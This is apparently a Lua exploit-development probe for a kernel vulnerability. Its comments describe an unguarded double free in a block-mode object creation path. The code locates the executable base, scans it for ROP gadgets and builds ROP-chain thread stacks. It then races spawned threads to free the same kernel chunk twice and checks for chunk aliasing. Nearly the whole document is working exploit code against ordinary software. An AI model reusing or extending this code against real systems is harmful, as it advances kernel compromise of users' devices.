-- CRASH_CLASS: HIGH
-- PROBE 847a: does path B's unguarded double free alias chunks?
--
-- Path B (block create, [T+2] > 1) frees the work item with no guard:
--   8ad6ffc4 test r12,r12 / je
--   8ad6ffcd dec r8d / mov [rax+2],r8w
--   8ad6ffe1 call 0x8b5b1760      ; destroy the item's event
--   8ad6fff2 call 0x8ad73e90      ; free(W)
--   8ad70003 mov [rcx+rdx*8],0    ; clear the slot AFTER the free
-- Path A has the C guard (8ad6fec3 / 8ad6fef5); path B has nothing.
--
-- Two children that both captured the same W therefore free the same 0x58
-- chunk twice. 727a showed the table survives, but only id uniqueness was
-- checked; a duplicated free-list entry shows up as two later allocations
-- landing on one chunk. A non-block create takes one 0x58 for its status block
-- S and one for its work item W, so an aliased pair makes two objects share a
-- status block - visible as a poll that is not 3, or a delete that is not 0.
--
-- [A] control with no race, [B] race + oracle rounds, [C] health.

print("=== PROBE 847a: block-mode double free and chunk aliasing ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end
print(string.format("[A] eboot=%X poprax=%X poprdi=%X poprsi=%X poprdx=%X", ebase, pop_rax, pop_rdi, pop_rsi, pop_rdx))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

local function spawn(idpage, stat)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(1))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(stat))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(662))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
local pout = mmap(page)
for i=0,7 do wd(data+i*4, i) end   -- a small, valid descriptor count region

-- Oracle: create N non-block objects, poll them, delete them, poll again.
local function oracle(tag)
    local N = 8
    local ids, polls, stats = mmap(page), mmap(page), mmap(page)
    local ids2, polls2 = mmap(page), mmap(page)
    for i=0,N-1 do
        local o = mmap(page)
        local ok, rv = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
        wd(ids+i*4, rd(o) or 0)
        if not (ok and to_num(rv)==0) then print(string.format("    %s create %d rv=%s", tag, i, tostring(to_num(rv)))) end
    end
    pcall(function() mk(664)(uint64(ids), uint64(N), uint64(polls)) end)
    local p1 = {}
    for i=0,N-1 do p1[#p1+1] = string.format("%08X", rd(polls+i*4) or 0) end
    pcall(function() mk(662)(uint64(ids), uint64(N), uint64(stats)) end)
    local d1 = {}
    for i=0,N-1 do d1[#d1+1] = string.format("%08X", rd(stats+i*4) or 0) end
    for i=0,N-1 do wd(ids2+i*4, rd(ids+i*4) or 0) end
    pcall(function() mk(664)(uint64(ids2), uint64(N), uint64(polls2)) end)
    local p2 = {}
    local bad = 0
    for i=0,N-1 do
        local v = rd(polls2+i*4) or 0
        p2[#p2+1] = string.format("%08X", v)
        if v ~= 0x80020003 then bad = bad + 1 end
    end
    print(string.format("  %s polls=[%s]", tag, table.concat(p1," ")))
    print(string.format("  %s deletes=[%s]", tag, table.concat(d1," ")))
    print(string.format("  %s after-delete polls=[%s] not-gone=%d", tag, table.concat(p2," "), bad))
    local anom = 0
    for i=0,N-1 do if (rd(polls+i*4) or 0) ~= 3 then anom = anom + 1 end end
    for i=0,N-1 do local v=rd(stats+i*4) or 0; if v ~= 0 then anom = anom + 1 end end
    return anom, bad
end

print("[A] control, no race:")
local ca, cb = oracle("ctrl")
print(string.format("[A] control anomalies=%d not-gone=%d", ca, cb))

local COUNT, KIDS, ROUNDS = 2, 4, 6
local tot_anom, tot_bad, two = 0, 0, 0
for r=1,ROUNDS do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(COUNT), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc)==0) then
        print(string.format("[B] round %d block create rv=%s", r, tostring(to_num(rvc))))
    else
        local base = rd(o) or 0
        local ids = mmap(page)
        for i=0,COUNT-1 do wd(ids+i*4, base + i*0x10000) end
        local polls = mmap(page)
        pcall(function() mk(664)(uint64(ids), uint64(COUNT), uint64(polls)) end)
        print(string.format("[B] round %d base=%08X polls=%08X %08X", r, base, rd(polls) or 0, rd(polls+4) or 0))
        local idpage = mmap(page)
        wd(idpage, base)
        wd(W, 0)
        local stats = {}
        local spawned = 0
        for k=1,KIDS do
            stats[k] = mmap(page); wd(stats[k], 0x77777777)
            if spawn(idpage, stats[k]) then spawned = spawned + 1 end
        end
        sleep_ms(15)
        for i=1,KIDS*2 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
        sleep_ms(25)
        local zeros, other = 0, {}
        for k=1,KIDS do
            local v = rd(stats[k]) or 0
            if v == 0 then zeros = zeros + 1 else other[#other+1] = string.format("%08X", v) end
        end
        if zeros >= 2 then two = two + 1 end
        print(string.format("[B] round %d spawned=%d zeros=%d other=[%s]", r, spawned, zeros, table.concat(other," ")))
        -- tear down the remaining item(s) of the block
        local rem, st = mmap(page), mmap(page)
        for i=1,COUNT-1 do wd(rem+(i-1)*4, base + i*0x10000) end
        pcall(function() mk(662)(uint64(rem), uint64(COUNT-1), uint64(st)) end)
        local rs = {}
        for i=0,COUNT-2 do rs[#rs+1] = string.format("%08X", rd(st+i*4) or 0) end
        print(string.format("[B] round %d remainder deletes=[%s]", r, table.concat(rs," ")))
    end
    local a, b = oracle(string.format("round %d", r))
    tot_anom = tot_anom + a; tot_bad = tot_bad + b
end

print(string.format("[C] races with two zeros=%d/%d  oracle anomalies=%d not-gone=%d", two, ROUNDS, tot_anom, tot_bad))
local ho, hp, hs = mmap(page), mmap(page), mmap(page)
local ok1, rv1 = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(ho)) end)
local ok2, rv2 = pcall(function() return mk(664)(uint64(ho), uint64(1), uint64(hp)) end)
local ok3, rv3 = pcall(function() return mk(662)(uint64(ho), uint64(1), uint64(hs)) end)
print(string.format("[C] health create=%s poll=%08X delete=%08X alive=true", tostring(to_num(rv1)), rd(hp) or 0, rd(hs) or 0))
